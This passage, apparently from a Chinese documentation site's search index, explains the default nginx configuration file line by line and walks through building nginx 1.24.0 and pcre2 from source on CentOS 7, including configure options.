\uff1a\u914d\u7f6e\u5f71\u54cdnginx\u670d\u52a1\u5668\u6216\u4e0e\u7528\u6237\u7684\u7f51\u7edc\u8fde\u63a5\u3002\u6709\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6700\u5927\u8fde\u63a5\u6570\uff0c\u9009\u53d6\u54ea\u79cd\u4e8b\u4ef6\u9a71\u52a8\u6a21\u578b\u5904\u7406\u8fde\u63a5\u8bf7\u6c42\uff0c\u662f\u5426\u5141\u8bb8\u540c\u65f6\u63a5\u53d7\u591a\u4e2a\u7f51\u8def\u8fde\u63a5\uff0c\u5f00\u542f\u591a\u4e2a\u7f51\u7edc\u8fde\u63a5\u5e8f\u5217\u5316\u7b49\u3002 http\u5757 \uff1a\u53ef\u4ee5\u5d4c\u5957\u591a\u4e2aserver\uff0c\u914d\u7f6e\u4ee3\u7406\uff0c\u7f13\u5b58\uff0c\u65e5\u5fd7\u5b9a\u4e49\u7b49\u7edd\u5927\u591a\u6570\u529f\u80fd\u548c\u7b2c\u4e09\u65b9\u6a21\u5757\u7684\u914d\u7f6e\u3002\u5982\u6587\u4ef6\u5f15\u5165\uff0cmime-type\u5b9a\u4e49\uff0c\u65e5\u5fd7\u81ea\u5b9a\u4e49\uff0c\u662f\u5426\u4f7f\u7528sendfile\u4f20\u8f93\u6587\u4ef6\uff0c\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u8fde\u63a5\u8bf7\u6c42\u6570\u7b49\u3002 server\u5757 \uff1a\u914d\u7f6e\u865a\u62df\u4e3b\u673a\u7684\u76f8\u5173\u53c2\u6570\uff0c\u4e00\u4e2ahttp\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2aserver\u3002 location\u5757 \uff1a\u914d\u7f6e\u8bf7\u6c42\u7684\u8def\u7531\uff0c\u4ee5\u53ca\u5404\u79cd\u9875\u9762\u7684\u5904\u7406\u60c5\u51b5 [root@VM-0-16-centos conf]# cd /usr/local/webserver/nginx/conf/ [root@VM-0-16-centos conf]# cat nginx.conf | grep -v \"^[[:blank:]]*#\" | grep -v '^#' | grep -v '^$' #\u53bb\u6389\u6ce8\u91ca worker_processes 1; #nginx\u6709\u4e00\u4e2a\u4e3b\u8fdb\u7a0b\u548c\u51e0\u4e2a\u5de5\u4f5c\u8fdb\u7a0b\u3002\u4e3b\u8fdb\u7a0b\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8bfb\u53d6\u548c\u8bc4\u4f30\u914d\u7f6e\uff0c #\u5e76\u7ef4\u62a4\u5de5\u4f5c\u8fdb\u7a0b\u3002\u5de5\u4f5c\u8fdb\u7a0b\u5bf9\u8bf7\u6c42\u8fdb\u884c\u5b9e\u9645\u5904\u7406\u3002nginx\u91c7\u7528\u57fa\u4e8e\u4e8b\u4ef6\u7684\u6a21\u578b #\u548c\u4f9d\u8d56\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u673a\u5236\u6765\u6709\u6548\u5730\u5728\u5de5\u4f5c\u8fdb\u7a0b\u4e4b\u95f4\u5206\u53d1\u8bf7\u6c42\u3002\u5de5\u4f5c\u8fdb\u7a0b\u7684\u6570\u91cf #\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u5e76\u4e14\u53ef\u4ee5\u9488\u5bf9 \u7ed9\u5b9a\u914d\u7f6e \u6216 \u81ea\u52a8\u8c03\u6574 \u3002 \u6b64\u5904\u503c\u53ef\u4ee5\u8bbe #\u7f6e\u6210\u6570\u5b57\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u6210auto \u8be6\u60c5\u89e3\u91ca\uff1ahttps://nginx.p2hp.com/en/docs/ngx_core_module.html#worker_processes events { worker_connections 1024; #\u5355\u4e2a\u540e\u53f0worker process\u8fdb\u7a0b\u7684\u6700\u5927\u5e76\u53d1\u94fe\u63a5\u6570 } http { include mime.types; # mime.types \u8bbe\u5b9amime\u7c7b\u578b(\u90ae\u4ef6\u652f\u6301\u7c7b\u578b),\u7c7b\u578b\u7531mime.types\u6587\u4ef6\u5b9a\u4e49 # include \u5728\u914d\u7f6e\u4e2d\u5305\u542b\u53e6\u4e00\u4e2a\u6216\u4e0e\u6307\u5b9a\u6587\u4ef6\u5339\u914d\u7684\u6587\u4ef6\u3002\u5305\u542b\u7684\u6587\u4ef6\u5e94\u7531\u8bed\u6cd5\u6b63\u786e\u7684\u6307\u4ee4\u548c\u5757\u7ec4\u6210\u3002 default_type application/octet-stream; #default_type \u5b9a\u4e49\u54cd\u5e94\u7684\u9ed8\u8ba4MIME\u7c7b\u578b\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u6307\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u6269\u5c55\u540d\u6620\u5c04\u5230MIME\u7c7b\u578b\u3002 sendfile on; # sendfile \u542f\u7528\u6216\u7981\u7528 sendfile()\u7684\u4f7f\u7528.\u4ece nginx 0.8.12 \u548c FreeBSD 5.2.1 \u5f00\u59cb\uff0c\u53ef\u4ee5\u4f7f\u7528 aio \u6765\u9884\u52a0\u8f7d\u6570\u636e \u4e3a\uff1asendfile() # https://nginx.p2hp.com/en/docs/http/ngx_http_core_module.html#sendfile keepalive_timeout 65; # keepalive_timeout \u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u670d\u52a1\u5668\u7aef\u7684\u4fdd\u6301\u6d3b\u52a8\u5ba2\u6237\u7aef\u8fde\u63a5\u5c06\u4fdd\u6301\u6253\u5f00\u72b6\u6001 server { listen 80; # listen \u8bbe\u7f6eIP\u7684\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u670d\u52a1\u5668\u63a5\u53d7\u8bf7\u6c42\u7684UNIX\u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u3002\u53ef\u4ee5\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u8005\u53ea\u80fd\u6307\u5b9a\u5730\u5740\u6216\u7aef\u53e3\u3002\u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u540d server_name localhost; # server_name \u8bbe\u7f6e\u865a\u62df\u670d\u52a1\u5668\u7684\u540d\u79f0 location / { # location \u6839\u636e\u8bf7\u6c42 URI \u8bbe\u7f6e\u914d\u7f6e\u3002 root html; # root \u8bbe\u7f6e\u8bf7\u6c42\u7684\u6839\u76ee\u5f55 index index.html index.htm; # \u5b9a\u4e49\u5c06\u7528\u4f5c\u7d22\u5f15\u7684\u6587\u4ef6\u3002 \u540d\u79f0\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 \u6309\u6307\u5b9a\u987a\u5e8f\u68c0\u67e5\u6587\u4ef6\u3002 \u5217\u8868\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u5177\u6709\u7edd\u5bf9\u8def\u5f84\u7684\u6587\u4ef6\u3002 } error_page 500 502 503 504 /50x.html; # \u5b9a\u4e49\u5c06\u4e3a\u6307\u5b9a\u9519\u8bef\u663e\u793a\u7684 URI\u3002 \u503c\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 location = /50x.html { root html; } } } \u5b8c\u6574\u7684\u9ed8\u8ba4nginx\u914d\u7f6e #user nobody; #user \u5b9a\u4e49\u5de5\u4f5c\u8fdb\u7a0b\u4f7f\u7528\u7684\u7528\u6237 \u4e0d\u586b\u5199\u9ed8\u8ba4\u4e3anobody worker_processes 1; #nginx\u6709\u4e00\u4e2a\u4e3b\u8fdb\u7a0b\u548c\u51e0\u4e2a\u5de5\u4f5c\u8fdb\u7a0b\u3002\u4e3b\u8fdb\u7a0b\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8bfb\u53d6\u548c\u8bc4\u4f30\u914d\u7f6e\uff0c #\u5e76\u7ef4\u62a4\u5de5\u4f5c\u8fdb\u7a0b\u3002\u5de5\u4f5c\u8fdb\u7a0b\u5bf9\u8bf7\u6c42\u8fdb\u884c\u5b9e\u9645\u5904\u7406\u3002nginx\u91c7\u7528\u57fa\u4e8e\u4e8b\u4ef6\u7684\u6a21\u578b #\u548c\u4f9d\u8d56\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u673a\u5236\u6765\u6709\u6548\u5730\u5728\u5de5\u4f5c\u8fdb\u7a0b\u4e4b\u95f4\u5206\u53d1\u8bf7\u6c42\u3002\u5de5\u4f5c\u8fdb\u7a0b\u7684\u6570\u91cf #\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u5e76\u4e14\u53ef\u4ee5\u9488\u5bf9 \u7ed9\u5b9a\u914d\u7f6e \u6216 \u81ea\u52a8\u8c03\u6574 \u3002 \u6b64\u5904\u503c\u53ef\u4ee5\u8bbe #\u7f6e\u6210\u6570\u5b57\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u6210auto \u8be6\u60c5\u89e3\u91ca\uff1ahttps://nginx.p2hp.com/en/docs/ngx_core_module.html#worker_processes #error_log logs/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; # \u5b9a\u4e49\u9519\u8bef\u65e5\u5fd7\u548c\u7ea7\u522b #pid logs/nginx.pid; # \u5b9a\u4e49\u4e00\u4e2a\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c06\u5b58\u50a8\u4e3b\u8fdb\u7a0b\u7684\u8fdb\u7a0bID\u3002 \u9ed8\u8ba4\u5728 logs/nginx.pid events { worker_connections 1024; # \u5355\u4e2a\u540e\u53f0worker process\u8fdb\u7a0b\u7684\u6700\u5927\u5e76\u53d1\u94fe\u63a5\u6570 } http { include mime.types; # mime.types \u8bbe\u5b9amime\u7c7b\u578b(\u90ae\u4ef6\u652f\u6301\u7c7b\u578b),\u7c7b\u578b\u7531mime.types\u6587\u4ef6\u5b9a\u4e49 # include \u5728\u914d\u7f6e\u4e2d\u5305\u542b\u53e6\u4e00\u4e2a\u6216\u4e0e\u6307\u5b9a\u6587\u4ef6\u5339\u914d\u7684\u6587\u4ef6\u3002\u5305\u542b\u7684\u6587\u4ef6\u5e94\u7531\u8bed\u6cd5\u6b63\u786e\u7684\u6307\u4ee4\u548c\u5757\u7ec4\u6210\u3002 default_type application/octet-stream; # default_type \u5b9a\u4e49\u54cd\u5e94\u7684\u9ed8\u8ba4MIME\u7c7b\u578b\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u6307\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u6269\u5c55\u540d\u6620\u5c04\u5230MIME\u7c7b\u578b\u3002 #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; # \u6307\u5b9a\u65e5\u5fd7\u683c\u5f0f\u3002 \u683c\u5f0f\u7684\u540d\u5b57 \u5b9a\u4e49\u8981\u8bb0\u5f55\u54ea\u4e9b\u4e1c\u897f # \u9700\u8981\u8bb0\u5f55\u54ea\u4e9b\u5b57\u6bb5\uff0c\u53ef\u4ee5\u4ece\u6b64\u7f51\u9875\u4e0a\u67e5\u770b # https://nginx.p2hp.com/en/docs/http/ngx_http_core_module.html#variables_hash_max_size # \u4f8b\u5982\u5982\u4e0b # $bytes_sent # \u53d1\u9001\u5230\u5ba2\u6237\u7aef\u7684\u5b57\u8282\u6570 # $connection # \u8fde\u63a5\u5e8f\u5217\u53f7 # $connection_requests # \u901a\u8fc7\u8fde\u63a5\u53d1\u51fa\u7684\u5f53\u524d\u8bf7\u6c42\u6570 \uff081.1.18\uff09 # $msec # \u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u65f6\u95f4\uff0c\u65e5\u5fd7\u5199\u5165\u65f6\u5206\u8fa8\u7387\u4e3a\u6beb\u79d2 # $pipe # \u201c\u201d if request was pipelined, \u201c\u201d otherwise p. # $request_length # \u8bf7\u6c42\u957f\u5ea6\uff08\u5305\u62ec\u8bf7\u6c42\u884c\u3001\u6807\u5934\u548c\u8bf7\u6c42\u6b63\u6587\uff09 # $request_time # \u8bf7\u6c42\u5904\u7406\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5206\u8fa8\u7387\u4e3a\u6beb\u79d2; # $status # \u54cd\u5e94\u72b6\u6001 # $time_iso8601 # ISO 8601 \u6807\u51c6\u683c\u5f0f\u7684\u5f53\u5730\u65f6\u95f4 # $time_local # \u901a\u7528\u65e5\u5fd7\u683c\u5f0f\u7684\u672c\u5730\u65f6\u95f4 #access_log logs/access.log main; # \u5b9a\u4e49\u8bbf\u95ee\u65e5\u5fd7 \u8def\u5f84 \u53ca\u683c\u5f0f sendfile on; # sendfile \u542f\u7528\u6216\u7981\u7528 sendfile()\u7684\u4f7f\u7528.\u4ece nginx 0.8.12 \u548c FreeBSD 5.2.1 \u5f00\u59cb\uff0c\u53ef\u4ee5\u4f7f\u7528 aio \u6765\u9884\u52a0\u8f7d\u6570\u636e \u4e3a\uff1asendfile() #tcp_nopush on; # \u542f\u7528\u6216\u7981\u7528FreeBSD\u4e0a\u7684\u5957\u63a5\u5b57\u9009\u9879\u6216Linux\u4e0a\u7684\u5957\u63a5\u5b57\u9009\u9879\u3002\u4ec5\u5f53\u4f7f\u7528sendfile\u65f6\uff0c\u624d\u4f1a\u542f\u7528\u8fd9\u4e9b\u9009\u9879\u3002\u542f\u7528\u8be5\u9009\u9879\u5141\u8bb8TCP_NOPUSHTCP_CORK #keepalive_timeout 0; keepalive_timeout 65; # keepalive_timeout \u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u670d\u52a1\u5668\u7aef\u7684\u4fdd\u6301\u6d3b\u52a8\u5ba2\u6237\u7aef\u8fde\u63a5\u5c06\u4fdd\u6301\u6253\u5f00\u72b6\u6001 #gzip on; #\u542f\u7528\u6216\u7981\u7528\u54cd\u5e94\u7684 gziping\u3002 server { listen 80; # listen \u8bbe\u7f6eIP\u7684\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u670d\u52a1\u5668\u63a5\u53d7\u8bf7\u6c42\u7684UNIX\u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u3002\u53ef\u4ee5\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u8005\u53ea\u80fd\u6307\u5b9a\u5730\u5740\u6216\u7aef\u53e3\u3002\u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u540d server_name localhost; # server_name \u8bbe\u7f6e\u865a\u62df\u670d\u52a1\u5668\u7684\u540d\u79f0 #charset koi8-r; # \u5c06\u6307\u5b9a\u7684\u5b57\u7b26\u96c6\u6dfb\u52a0\u5230\u201c\u5185\u5bb9\u7c7b\u578b\u201d \u54cd\u5e94\u6807\u5934\u5b57\u6bb5\u3002 #access_log logs/host.access.log main; # \u8fd9\u4e2aserver\u7684\u8bbf\u95ee\u65e5\u5fd7 location / { # location \u6839\u636e\u8bf7\u6c42 URI \u8bbe\u7f6e\u914d\u7f6e\u3002 root html; # root \u8bbe\u7f6e\u8bf7\u6c42\u7684\u6839\u76ee\u5f55 index index.html index.htm; # \u5b9a\u4e49\u5c06\u7528\u4f5c\u7d22\u5f15\u7684\u6587\u4ef6\u3002 \u540d\u79f0\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 \u6309\u6307\u5b9a\u987a\u5e8f\u68c0\u67e5\u6587\u4ef6\u3002 \u5217\u8868\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u5177\u6709\u7edd\u5bf9\u8def\u5f84\u7684\u6587\u4ef6\u3002 } #error_page 404 /404.html; # \u5b9a\u4e49\u5c06\u4e3a\u6307\u5b9a\u9519\u8bef\u663e\u793a\u7684 URI\u3002 \u503c\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 # redirect server error pages to the static page /50x.html # \u5c06\u670d\u52a1\u5668\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u5230\u9759\u6001\u9875\u9762/50x.html error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # \u5728127.0.0.1:80\u4e0a\u5c06PHP\u811a\u672c\u4ee3\u7406\u5230Apache\u76d1\u542c #location ~ \\.php$ { # proxy_pass http://127.0.0.1; # \u8bbe\u7f6e\u4ee3\u7406\u670d\u52a1\u5668\u7684\u534f\u8bae\u548c\u5730\u5740\uff0c\u4ee5\u53ca\u5e94\u6620\u5c04\u4f4d\u7f6e\u7684\u53ef\u9009URI\u3002\u4f5c\u4e3a\u534f\u8bae\uff0c\u53ef\u4ee5\u6307\u5b9a\u201c\u201d\u6216\u201c\u201d\u3002 # \u5730\u5740\u53ef\u4ee5\u6307\u5b9a\u4e3a\u57df\u540d\u6216IP\u5730\u5740\uff0c\u4ee5\u53ca\u53ef\u9009\u7aef\u53e3\u3002 \u53ef\u4ee5\u8bbe\u7f6e\u4e00\u7ec4\u670d\u52a1\u5668\uff0c\u7528\u670d\u52a1\u5668\u7ec4\u8fdb\u884c\u8bbe\u7f6e # https://nginx.p2hp.com/en/docs/http/ngx_http_proxy_module.html#proxy_pass #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # \u5c06PHP\u811a\u672c\u4f20\u9012\u5230FastCGI\u670d\u52a1\u5668\uff0c\u5728127.0.0.1:9000\u4e0a\u76d1\u542c #location ~ \\.php$ { # root html; # fastcgi_pass 127.0.0.1:9000; # \u8bbe\u7f6e FastCGI \u670d\u52a1\u5668\u7684\u5730\u5740\u3002 \u5730\u5740\u53ef\u4ee5\u6307\u5b9a\u4e3a\u57df\u540d\u6216 IP \u5730\u5740\uff0c \u548c\u4e00\u4e2a\u7aef\u53e3\uff1a # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache's document root concurs with nginx's one # \u5982\u679cApache\u7684\u6587\u6863\u6839\u4e0enginx\u7684\u6587\u6863\u6839\u4e00\u81f4\uff0c\u5219\u62d2\u7edd\u8bbf\u95ee.htaccess\u6587\u4ef6 #location ~ /\\.ht { # deny all; #} } # another virtual host using mix of IP-, name-, and port-based configuration # \u53e6\u4e00\u4e2a\u4f7f\u7528\u57fa\u4e8eIP\u3001\u540d\u79f0\u548c\u7aef\u53e3\u7684\u914d\u7f6e\u7ec4\u5408\u7684\u865a\u62df\u4e3b\u673a #server { # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / { # root html; # index index.html index.htm; # } #} # HTTPS server # #server { # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # \u4e3a\u7ed9\u5b9a\u7684\u865a\u62df\u670d\u52a1\u5668\u6307\u5b9a\u5177\u6709PEM\u683c\u5f0f\u8bc1\u4e66\u3002\u5982\u679c\u9664\u4e86\u4e3b\u8bc1\u4e66\u4e4b\u5916\u8fd8\u5e94\u6307\u5b9a\u4e2d\u95f4\u8bc1\u4e66\uff0c\u5219\u5e94\u5728\u540c\u4e00\u6587\u4ef6\u4e2d\u6309\u4ee5\u4e0b\u987a\u5e8f\u6307\u5b9a\u5b83\u4eec\uff1a\u5148\u6307\u5b9a\u4e3b\u8bc1\u4e66\uff0c\u7136\u540e\u6307\u5b9a\u4e2d\u95f4\u8bc1\u4e66\u3002PEM\u683c\u5f0f\u7684\u5bc6\u94a5\u53ef\u4ee5\u88ab\u653e\u7f6e\u5728\u76f8\u540c\u7684\u6587\u4ef6\u4e2d\u3002 # ssl_certificate_key cert.key; # key\u683c\u5f0f\u7684\u8bc1\u4e66 # ssl_session_cache shared:SSL:1m; # \u8bbe\u7f6e\u5b58\u50a8\u4f1a\u8bdd\u53c2\u6570\u7684\u7f13\u5b58\u7684\u7c7b\u578b\u548c\u5927\u5c0f\u3002 # ssl_session_timeout 5m; # \u6307\u5b9a\u5ba2\u6237\u7aef\u53ef\u4ee5\u91cd\u7528\u4f1a\u8bdd\u53c2\u6570\u7684\u65f6\u95f4\u3002 # ssl_ciphers HIGH:!aNULL:!MD5; # \u6307\u5b9a\u542f\u7528\u7684\u5bc6\u7801\u3002 \u5bc6\u7801\u4ee5 OpenSSL\u5e93 # ssl_prefer_server_ciphers on; # \u6307\u5b9a\u670d\u52a1\u5668\u5bc6\u7801\u5e94\u4f18\u5148\u4e8e\u5ba2\u6237\u7aef \u4f7f\u7528 SSLv3 \u548c TLS \u534f\u8bae\u65f6\u7684\u5bc6\u7801 # # location / { # root html; # index index.html index.htm; # } #} } \u6700","title":"Nginx\u914d\u7f6e\u6587\u4ef6\u8be6\u89e3"},{"location":"middleware/nginx/nginx_install/","text":"Nginx\u76f8\u5173\u5730\u5740 \u6e90\u7801\uff1ahttps://trac.nginx.org/nginx/browser \u5b98\u7f51\uff1ahttp://www.nginx.org/ \u4e2d\u6587\u6559\u7a0b\uff1ahttps://github.com/taobao/nginx-book \u4e2d\u6587\u7b80\u5355\u6559\u7a0b\uff1ahttps://github.com/dunwu/nginx-tutorial Nginx\u5b89\u88c5 nginx\u6700\u5e38\u89c1\u7684\u5b89\u88c5\u65b9\u5f0f\u662f\u6e90\u7801\u8fdb\u884c\u5b89\u88c5\uff0c\u4e3b\u8981\u539f\u56e0\u662f\u597d\u7ef4\u62a4\uff0c\u867d\u7136\u5b98\u65b9\u63d0\u4f9b\u4e86rpm\uff0cYUM\u7b49\u5b89\u88c5\u65b9\u5f0f\u3002\u4e0b\u9762\u7684\u90e8\u7f72\u65b9\u5f0f\u662f\u5728CentOS7\u4e0b \u901a\u5e38\u4f1a\u628a\u6e90\u7801\u5305\u653e\u5728Linux\u7cfb\u7edf\u4e2d\u7684 /usr/local/src \u76ee\u5f55\u4e0b\uff0c\u8fd9\u4e2a\u76ee\u5f55\u662f\u5b58\u653e\u672c\u5730\u6e90\u4ee3\u7801\u7684\u76ee\u5f55 \u8fd9\u4e2a\u76ee\u5f55\u7684\u4f7f\u7528\u89c4\u5219\u662f\u4e2a\u7ea6\u5b9a\u4fd7\u79f0\u7684\u4e00\u4e2a\u89c4\u8303\uff0c\u8fd9\u91cc\u653e\u4e00\u4e2a\u767e\u79d1\u5730\u5740\uff1a Filesystem Hierarchy Standard - Wikipedia \uff0c\u767e\u79d1\u4e0b\u9762\u6709Linux\u57fa\u91d1\u4f1a\u5b98\u65b9\u7684\u5730\u5740 Linux\u57fa\u91d1\u4f1a\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7f51\u9875\u7248\u672c\u7684\u76ee\u5f55\u4ecb\u7ecd\uff1a 4.9. /usr/local : Local hierarchy (linuxfoundation.org) 1\u3001\u5b89\u88c5\u4f9d\u8d56 [root@VM-0-16-centos src]# yum install -y gcc gcc-c++ make zlib zlib-devel gcc-c++ openssl-devel [root@VM-0-16-centos src]# yum install -y libtool [root@VM-0-16-centos src]# yum install -y openssl \u5b89\u88c5\u4f9d\u8d56 pcre2 PCRE\u5b98\u7f51 PCRE - Perl Compatible Regular Expressions [root@VM-0-16-centos ~]# cd /usr/local/src [root@VM-0-16-centos src]# wget https://github.com/PCRE2Project/pcre2/releases/download/pcre2-10.42/pcre2-10.42.tar.gz [root@VM-0-16-centos src]# ls pcre2-10.42.tar.gz [root@VM-0-16-centos src]# tar -zxvf pcre2-10.42.tar.gz [root@VM-0-16-centos src]# ls pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# cd pcre2-10.42 [root@bogon pcre2-10.42]# ./configure [root@bogon pcre2-10.42]# make && make install 2\u3001\u4e0b\u8f7d\u5b89\u88c5\u5305 \u5b98\u7f51\u4e0b\u8f7d\u5730\u5740\uff1a nginx: \u4e0b\u8f7d (p2hp.com) [root@VM-0-16-centos ~]# cd /usr/local/src [root@VM-0-16-centos src]# wget http://nginx.org/download/nginx-1.24.0.tar.gz nginx-1.24.0.tar.gz 100%[===================================================>] 1.06M 27.7KB/s in 54s [root@VM-0-16-centos src]# ls nginx-1.24.0.tar.gz 3\u3001\u7f16\u8bd1\u5e76\u5b89\u88c5 \u89e3\u538b\u5b89\u88c5\u5305 [root@VM-0-16-centos src]# ls nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# tar -zxvf nginx-1.24.0.tar.gz [root@VM-0-16-centos src]# ls nginx-1.24.0 nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz \u5bf9nginx\u7f16\u8bd1\u524d\u914d\u7f6e --prefix=/usr/local/webserver/nginx #\u5b89\u88c5\u8def\u5f84 --with-http_stub_status_module \u8be5\u6a21\u5757\u63d0\u4f9b \u8bbf\u95ee\u57fa\u672c\u72b6\u6001\u4fe1\u606f --with-http_ssl_module \u8be5\u6a21\u5757\u63d0\u4f9b \u5bf9 HTTPS \u7684\u5fc5\u8981\u652f\u6301 --with-pcre \u8bbe\u7f6e PCRE\u5e93\u7684\u6e90\u7801\u7684\u8def\u5f84\u3002 \u8be5\u5e93\u88abngx_http_rewrite_module\u6a21\u5757\u6240\u9700\u8981 [root@VM-0-16-centos src]# ls nginx-1.24.0 nginx-1.24.0.tar.gz pcre2-10.42 pcre2-10.42.tar.gz [root@VM-0-16-centos src]# cd nginx-1.24.0 [root@VM-0-16-centos nginx-1.24.0]# ./configure --prefix=/usr/local/webserver/nginx --with-http_stub_status_module --with-http_ssl_module --with-pcre=/usr/local/src/pcre2-10.42 ... ... Configuration summary + using PCRE2 library: /usr/local/src/pcre2-10.42 + using system OpenSSL library + using system zlib library nginx path prefix: \"/usr/local/webserver/nginx\" nginx binary file: \"/usr/local/webserver/nginx/sbin/nginx\" nginx modules path: \"/usr/local/webserver/nginx/modules\" nginx configuration prefix: \"/usr/local/webserver/nginx/conf\" nginx configuration file: \"/usr/local/webserver/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/webserver/nginx/logs/nginx.pid\" nginx error log file: \"/usr/local/webserver/nginx/logs/error.log\" nginx http access log file: \"/usr/local/webserver/nginx/logs/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@VM-0-16-centos nginx-1.24.0]# make && make install [root@VM-0-16-centos nginx]# pwd /usr/local/webserver/nginx [root@VM-0-16-centos nginx]# tree . \u251c\u2500\u2500 conf #\u9ed8\u8ba4\u914d\u7f6e\u76ee\u5f55 \u2502 \u251c\u2500\u2500 fastcgi.conf \u2502 \u251c\u2500\u2500 fastcgi.conf.default \u2502 \u251c\u2500\u2500 fastcgi_params \u2502 \u251c\u2500\u2500 fastcgi_params.default \u2502 \u251c\u2500\u2500 koi-utf \u2502 \u251c\u2500\u2500 koi-win \u2502 \u251c\u2500\u2500 mime.types \u2502 \u251c\u2500\u2500 mime.types.default \u2502 \u251c\u2500\u2500 nginx.conf \u2502 \u251c\u2500\u2500 nginx.conf.default \u2502 \u251c\u2500\u2500 scgi_params \u2502 \u251c\u2500\u2500 scgi_params.default \u2502 \u251c\u2500\u2500 uwsgi_params \u2502 \u251c\u2500\u2500 uwsgi_params.default \u2502 \u2514\u2500\u2500 win-utf \u251c\u2500\u2500 html #\u5b58\u653e\u7f51\u9875\u7684\u76ee\u5f55 \u2502 \u251c\u2500\u2500 50x.html \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 logs #\u65e5\u5fd7\u76ee\u5f55 \u2514\u2500\u2500 sbin #nginx\u4e8c\u8fdb\u5236\u6587\u4ef6 \u2514\u2500\u2500 ngin NGINX \u7f16\u8bd1\u7684\u9009\u9879 configure --help \u5b98\u7f51\u8bf4\u660e\uff1a \u4ece\u6e90\u4ee3\u7801\u6784\u5efanginx [root@VM-0-16-centos nginx-1.24.0]# ./configure --help --help \u6253\u5370\u6b64\u5e2e\u52a9 --prefix=PATH \u8bbe\u7f6e\u5b89\u88c5\u8def\u5f84 --sbin-path=PATH \u8bbe\u7f6enginx\u4e8c\u8fdb\u5236\u8def\u5f84 --modules-path=PATH \u8bbe\u7f6e\u6a21\u5757\u8def\u5f84 --conf-path=PATH \u8bbe\u7f6enginx.conf\u8def\u5f84 --error-log-path=PATH \u8bbe\u7f6eerror log\u8def\u5f84 --pid-path=PATH \u8bbe\u7f6enginx.pid\u8def\u5f84 --lock-path=PATH \u8bbe\u7f6enginx.lock\u8def\u5f84 --user=USER \u4e3a\u5de5\u4f5c\u8fdb\u7a0b\u8bbe\u7f6e\u975e\u7279\u6743\u7528\u6237 --group=GROUP \u4e3a\u5de5\u4f5c\u8fdb\u7a0b\u8bbe\u7f6e\u975e\u7279\u6743\u7528\u6237\u7ec4 --build=NAME \u8bbe\u7f6e build \u540d\u5b57 --builddir=DIR \u8bbe\u7f6e build \u76ee\u5f55 --with-select_module \u542f\u7528\u9009\u62e9\u6a21\u5757 --without-select_module \u7981\u7528\u9009\u62e9\u6a21\u5757 --with-poll_module \u542f\u7528polL\u6a21\u5757 --without-poll_module \u7981\u7528polL\u6a21\u5757 --with-threads \u542f\u7528\u7ebf\u7a0b\u6c60\u652f\u6301 --with-file-aio \u542f\u7528\u6587\u4ef6AIO\u652f\u6301 --with-http_ssl_module \u542f\u7528ngx_http_ssl_module --with-http_v2_module \u542f\u7528 ngx_http_v2_module --with-http_realip_module \u542f\u7528 ngx_http_realip_module --with-http_addition_module \u542f\u7528 ngx_http_addition_module --with-http_xslt_module \u542f\u7528 ngx_http_xslt_module --with-http_xslt_module=dynamic \u542f\u7528 dynamic ngx_http_xslt_module 